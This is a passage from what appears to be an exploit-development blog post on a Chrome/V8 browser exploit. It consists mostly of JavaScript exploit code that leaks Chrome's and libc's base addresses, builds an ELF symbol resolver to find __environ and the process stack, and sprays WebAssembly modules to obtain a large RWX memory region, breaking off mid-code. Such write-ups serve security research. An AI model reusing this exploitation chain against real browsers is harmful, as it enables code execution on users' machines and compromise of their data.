<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_image_base</span>(<span style="color:#a6e22e">ptr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dword</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">centinel</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ptr</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">dword</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0x464c457f</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">centinel</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x1000</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dword</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">centinel</span>), <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">centinel</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">div</span> <span style="color:#f92672">=</span> window.document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;div&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">div_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stable_addrof</span>(<span style="color:#a6e22e">div</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">_HTMLDivElement</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">div_addr</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xC</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">HTMLDivElement_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">weak_read</span>(<span style="color:#a6e22e">_HTMLDivElement</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ptr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>((<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">HTMLDivElement_addr</span>) <span style="color:#f92672">-</span> <span style="color:#a6e22e">kBaseSearchSpaceOffset</span>) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">0xfff</span><span style="color:#a6e22e">n</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">chrome_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_image_base</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">ptr</span>));</span></span></code></pre></div>
In order to leak the base address of Chrome, we start by creating an arbitrary DOM element. Usually, DOM elements have references within their object layout to some part of Blink&rsquo;s code base. As an example, we can create a <code>div</code> element to leak one of these pointers and then subtract the appropriate offset from it to retrieve Chrome&rsquo;s base, or scan backward in search for an ELF header magic.</p>
<h3 id="leaking-libc-base">Leaking Libc base<a href="#leaking-libc-base" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Once we have successfully retrieved the base of Chrome, we can retrieve a pointer to libc from Chrome&rsquo;s Global Offset Table (GOT), as this should be a fixed offset per Chrome patch level. After that, we can apply the same methodology as for retrieving the base address of Chrome, by scanning backward for an ELF header magic:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">libc_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">chrome_accesor</span>.<span style="color:#a6e22e">getFloat64</span>(<span style="color:#a6e22e">kGOTOffset</span>, <span style="color:#66d9ef">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">libc_leak</span>) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">0xfff</span><span style="color:#a6e22e">n</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">libc_base</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_image_base</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">libc_leak</span>));</span></span></code></pre></div>
<h3 id="leaking-the-process-stack">Leaking the process stack<a href="#leaking-the-process-stack" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Now that we have libc&rsquo;s base address, we can retrieve the symbol <code>__environ</code> from libc as it will point to the process&rsquo; environment variables held in the stack.
Since for this post we are writing an exploit that is dependent of Chrome version, we need to be able to resolve the address of this symbol independently of libc version.
To do this, we can build a resolver in JavaScript leveraging our stable read primitive.</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">elf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Elf</span>(<span style="color:#a6e22e">libc_base</span>, <span style="color:#a6e22e">libc_accesor</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">environ_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">elf</span>.<span style="color:#a6e22e">resolve_reloc</span>(<span style="color:#e6db74">&#34;__environ&#34;</span>, <span style="color:#a6e22e">R_X86_64_GLOB_DAT</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stack_leak</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">libc_accesor</span>.<span style="color:#a6e22e">getBigUint64</span>(Number(<span style="color:#a6e22e">environ_addr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">libc_base</span>), <span style="color:#66d9ef">true</span>)</span></span></code></pre></div>
Ultimately, we have to retrieve the address of libc&rsquo;s  <code>DYNAMIC</code> segment to resolve various dynamic entries including the address of the relocation table held in <code>DT_RELA</code> in order to scan for relocations, the address of <code>DT_STRTAB</code> for accessing the <code>.dynstr</code> and the address of <code>DT_SYMTAB</code> for accessing symbol entries in <code>.dynsym</code>.</p>
<p>We can then iterate the relocation table to search for the symbol we want. A snippet of the relevant code of this ELF resolver to retrieve relocation entries is shown below:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">phnum</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_phnum</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">phoff</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_phoff</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">phnum</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">=</span>  <span style="color:#a6e22e">phoff</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sizeof_Elf64_Phdr</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">p_type</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_p_type</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">p_type</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">PT_DYNAMIC</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">dyn_phdr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dyn_phdr_filesz</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">phoff</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sizeof_Elf64_Phdr</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">dyn_phdr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_p_filesz</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dyn_phdr_vaddr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">phoff</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sizeof_Elf64_Phdr</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">dyn_phdr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_p_vaddr</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">dyn_phdr_filesz</span><span style="color:#f92672">/</span><span style="color:#a6e22e">sizeof_Elf64_Dyn</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">dyn_offset</span> <span style="color:#f92672">=</span>  <span style="color:#a6e22e">dyn_phdr_vaddr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">sizeof_Elf64_Dyn</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">i</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">d_tag</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dyn_offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_d_tag</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">d_val</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">dyn_offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_d_un_d_val</span>, <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">d_tag</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_PLTGOT</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pltgot</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_JMPREL</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jmprel</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_PLTRELSZ</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pltrelsz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_SYMTAB</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">symtab</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_STRTAB</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">strtab</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_STRSZ</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">strsz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_RELAENT</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">relaent</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_RELA</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rel</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#a6e22e">DT_RELASZ</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">relasz</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d_val</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">centinel</span>, <span style="color:#a6e22e">size</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sym_type</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">R_X86_64_GLOB_DAT</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">centinel</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">rel</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">relasz</span><span style="color:#f92672">/</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">relaent</span>;
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">centinel</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">jmprel</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">size</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pltrelsz</span><span style="color:#f92672">/</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">relaent</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">size</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">rela_offset</span> <span style="color:#f92672">=</span>  <span style="color:#a6e22e">centinel</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">sizeof_Elf64_Rela</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">r_type</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">rela_offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_r_info</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">r_sym</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">rela_offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_r_info</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span><span style="color:#a6e22e">n</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sym_address</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">r_type</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">sym_type</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sym_offset</span> <span style="color:#f92672">=</span>  <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">symtab</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">r_sym</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">sizeof_Elf64_Sym</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sym_offset</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">st_name</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">sym_offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_st_name</span>, <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">st_name</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sym_type</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">R_X86_64_GLOB_DAT</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sym_address</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">base_addr</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">sym_offset</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">offsetof_st_value</span>, <span style="color:#ae81ff">4</span>));
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sym_address</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">pltgot</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">st_name</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sym_str_addr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">strtab</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">st_name</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">sym_str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#66d9ef">char</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> (<span style="color:#66d9ef">true</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">read</span>(<span style="color:#a6e22e">sym_str_addr</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sym_str</span> <span style="color:#f92672">+=</span> String.<span style="color:#a6e22e">fromCharCode</span>(<span style="color:#66d9ef">char</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">sym_str_addr</span><span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">sym_name</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">sym_str</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sym_address</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
<!-- raw HTML omitted --></p>
<hr>
<h2 id="achieving-a-stable-large-rwx-region">Achieving a stable large RWX region<a href="#achieving-a-stable-large-rwx-region" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Once we have leaked the location of all the memory regions we need, we now have to somehow allocate a big enough memory region that is both writable and executable.</p>
<p>There are various techniques to achieve this. As documented by Brendon Tiszka, there is a possibility to disable <code>W^X</code>, a protection that was enabled on JIT memory that prevents it from being both writable and executable.</p>
<p>There is also the possibility to encode our payload as float variables in a JITed function to neglect the need of a writable region.</p>
<p>However, as of today WASM memory pages are <code>RWX</code>, therefore that&rsquo;s what we will be using for convenience.</p>
<p>I noticed that even if I created several WASM instances, only one <code>RWX</code> page was allocated, meaning that each Wasm instance or module does not get a dedicated <code>RWX</code> page. However, if we spray WASM modules we will eventually force v8 to enlarge our RWX region.</p>
<p>We can do this as follows:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// forcing V8 to generate a continuous RWX memory region of 0x801000 bytes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x10000</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasm_code</span>));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// retrieving start address of RWX region
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasm_mod</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Module</span>(<span style="color:#a6e22e">wasm_code</span>);            
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasm_instance</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WebAssembly</span>.<span style="color:#a6e22e">Instance</span>(<span style="color:#a6e22e">wasm_mod</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasm_entry</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm_instance</span>.<span style="color:#a6e22e">exports</span>.<span style="color:#a6e22e">main</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">stable_addrof</span>(<span style="color:#a6e22e">wasm_instance</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wasm_instance_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">wasm_instance_addr</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x68</span><span style="color:#a6e22e">n</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#a6e22e">n</span>;
